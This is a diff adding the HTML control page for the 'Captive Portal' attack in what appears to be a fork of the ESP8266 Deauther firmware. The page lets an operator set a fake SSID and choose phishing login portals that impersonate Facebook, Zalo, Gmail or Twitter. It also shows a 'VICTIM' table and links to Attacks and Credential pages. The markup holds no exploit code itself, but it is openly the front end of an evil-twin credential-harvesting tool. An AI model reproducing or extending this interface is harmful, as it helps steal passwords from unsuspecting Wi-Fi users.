@@ -1,0 +1,115 @@
+<!Doctype html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+	<meta name="description" content="ESP8266 Deauther">
+	<meta name="author" content="Spacehuhn - Stefan Kremser">
+	<meta name="theme-color" content="#023500" />
+	<title>CAPTIVE PORTAL</title>
+	<link rel="stylesheet" href="style.css">
+	<style>
+		::-webkit-scrollbar {
+			width: 10px;
+		}
+		::-webkit-scrollbar-thumb {
+			background: darkgreen;
+			border-radius: 4px;
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: #00ff00;
+		}
+	</style>
+	<script src="js/site.js"></script>
+	<script src="js/scan.js"></script>
+</head>
+
+<body onload="loadLang()">
+	<nav>
+		<a href="scan.html" data-translate="scan">Scan</a>
+		<a href="ssids.html" data-translate="ssids">SSIDs</a>
+		<a href="attack.html" data-translate="attacks">Attacks</a>
+		<a href="captiveportal.html" data-translate="captivePortal" class="active">captive Portal</a>
+		<a href="credential.html" data-translate="credential">Credential</a>
+		<a href="settings.html" data-translate="settings">Settings</a>
+	</nav>
+	<div class="container">
+		<div class="row">
+			<div class="col-12">
+				<div id="error" class="hide"></div>
+				<h1 class="header" data-translate="captivePortal" style="font-weight: bold; font-size: 17.6px; padding: 0.4em 1.8em;">Captive Portal</h1>
+				<!-- <button onclick="captivePortalAttack()" class="red" data-translate="attacks">Attack</button> -->
+				<button onclick="captivePortalAttack()" class="animated-button5">
+					<span></span>
+					<span></span>
+					<span></span>
+					<span></span>
+					Tấn công
+				</button>
+				<!-- <button onclick="load()" data-translate="reload" class="right">Reload</button> -->
+				<button onclick="load()" class="right animated-button5">
+					<span></span>
+					<span></span>
+					<span></span>
+					<span></span>
+					Tải lại</button>
+			</div>
+		</div>
+		<div class="row ">
+			<div class='row' style="display: flex; align-items: center;">
+				<div class='col-6'>
+					<label class="" for='ssid_name' data-translate="fakessid">FAKE SSID :</label>
+				</div>
+				<div class='col-6'>
+					<input type='text' name='ssid_name' id="ssid_captive">
+				</div>
+			</div>
+
+			<div class='row'>
+				<div class='col-12'>
+					<!-- <p>lang()</p> -->
+					<hr>
+				</div>
+			</div>
+
+			<div class="row" style="display: flex; align-items: center;">
+				<div class="col-6">
+					<!-- <label for="captivePortal" data-translate="captivePortal">Captive portal</label> -->
+					<label for="captivePortal">Captive Portal</label>
+				</div>
+				<div class="col-6">
+					<select id="captivePortal_id" name="captivePortal">
+						<option value="0">Facebook</option>
+						<option value="1">Zalo</option>
+						<option value="2">Gmail</option>
+						<option value="3">Twitter</option>
+						<option value="4">All</option>
+					</select>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-12">
+				<hr>
+				<h2 style="font-weight: bold"><span data-translate="victim">VICTIM</span>: <span id="apNum"></span></h2>
+				<table id="apTable"></table>
+				<hr>
+
+				<div class="hide">
+					<select id="ch" name="ch"></select>
+					<h2><span>Stations</span>: <span id="stNum"></span></h2>
+					<table id="stTable"></table>
+					<h2><span data-translate="devices">Saved Devices</span>: <span id="nNum"></span></h2>
+					<table id="nTable"></table>
+				</div>
+				<div id="copyright">
+					<b>COPYRIGHT &copy; 2024 TRAN THANH VU PHUONG</b>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
